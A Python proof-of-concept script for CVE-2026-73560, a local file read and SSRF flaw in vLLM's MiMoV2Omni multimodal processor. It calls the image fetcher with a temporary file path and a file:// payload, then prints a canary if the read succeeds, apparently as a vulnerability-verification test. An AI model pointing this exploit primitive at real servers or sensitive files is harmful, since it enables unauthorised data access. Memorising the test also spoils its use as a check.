#!/usr/bin/env python3
# PoC for CVE-2026-73560 — vLLM MiMoV2OmniMultiModalProcessor SSRF / arbitrary
# local file read (CWE-918). The processor's image handling calls _fetch_image ->
# Image.open / requests.get directly instead of routing through MediaConnector,
# so allowed_local_media_path (default: None => no local reads permitted) is
# bypassed. We demonstrate the arbitrary-file-read primitive: a local file that
# is NOT under any configured allowed_local_media_path is opened and returned as
# a PIL image. On the patched build this path goes through MediaConnector, which
# with allowed_local_media_path unset refuses the local read (or _fetch_image no
# longer performs the raw read), so no image is produced and the canary is never
# printed.

import os
import inspect
import tempfile

from PIL import Image


def _make_secret_image():
    # A distinctive local file placed outside any allowed_local_media_path.
    # Its very readability is the sensitive resource the SSRF/file-read exposes.
    fd, path = tempfile.mkstemp(prefix="poc_secret_", suffix=".png")
    os.close(fd)
    Image.new("RGB", (13, 7), (17, 42, 200)).save(path)
    return path


def _iter_fetchers(mod):
    """Yield ('func', callable) or ('method', (cls, func)) candidates."""
    # Module-level function first.
    for name in ("_fetch_image", "fetch_image"):
        fn = getattr(mod, name, None)
        if callable(fn):
            yield "func", fn
    # Methods on any processor class in the module.
    for cname in dir(mod):
        cls = getattr(mod, cname, None)
        if not isinstance(cls, type):
            continue
        for name in ("_fetch_image", "fetch_image"):
            fn = cls.__dict__.get(name)
            if callable(fn):
                yield "method", (cls, fn)


def _try_call(kind, obj, arg):
    try:
        if kind == "func":
            fn = obj
            # Call with just the media string; tolerate extra optional params.
            try:
                return fn(arg)
            except TypeError:
                params = list(inspect.signature(fn).parameters.values())
                extra = [None] * max(0, len(params) - 1)
                return fn(arg, *extra)
        else:
            cls, fn = obj
            # Build an instance without running __init__ (which needs HF config).
            inst = object.__new__(cls)
            try:
                return fn(inst, arg)
            except TypeError:
                params = list(inspect.signature(fn).parameters.values())
                extra = [None] * max(0, len(params) - 2)
                return fn(inst, arg, *extra)
    except Exception:
        return None


def main():
    import vllm.transformers_utils.processors.mimo_v2_omni as mod

    secret = _make_secret_image()

    # Local path AND file:// form — both must bypass MediaConnector on the
    # vulnerable build; both are refused by MediaConnector on the patched build.
    payloads = [secret, "file://" + secret]

    for kind, obj in _iter_fetchers(mod):
        for payload in payloads:
            result = _try_call(kind, obj, payload)
            if isinstance(result, Image.Image):
                # Arbitrary local file read succeeded via the vulnerable
                # primitive: emit the canary as a direct consequence.
                try:
                    result.load()
                except Exception:
                    pass
                print(os.environ["POC_CANARY"])
                return


if __name__ == "__main__":
    main()